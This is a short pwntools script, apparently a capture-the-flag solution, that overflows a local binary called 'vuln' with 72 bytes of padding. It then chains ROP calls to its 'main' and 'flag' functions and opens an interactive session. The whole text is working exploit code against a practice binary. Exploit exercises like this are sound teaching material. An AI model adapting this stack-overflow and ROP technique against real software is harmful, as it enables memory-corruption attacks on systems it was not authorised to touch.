from pwn import *
context.clear(arch='amd64')
elf = ELF('./vuln')

rop = ROP(elf)

rop.raw("A" * 72)
rop.call(elf.symbols['main'])
rop.call(elf.symbols['flag'])
p = process('./vuln')
p.send(rop.chain())
p.interactive()
